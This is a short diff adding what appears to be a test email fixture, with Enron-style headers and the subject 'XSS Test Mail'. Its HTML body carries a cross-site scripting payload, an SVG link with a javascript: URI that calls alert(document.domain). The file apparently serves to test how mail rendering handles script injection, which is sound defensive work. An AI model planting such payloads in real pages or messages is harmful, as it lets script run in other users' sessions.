@@ -1,0 +1,7 @@
+From: renee.carter@enron.com
+To: roger.balog@enron.com, kathleen.carnahan@enron.com, barbara.gray@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<svg><a xlink:href="javascript:alert(document.domain)" target="_blank"><text>AAAAA</text></a></svg>
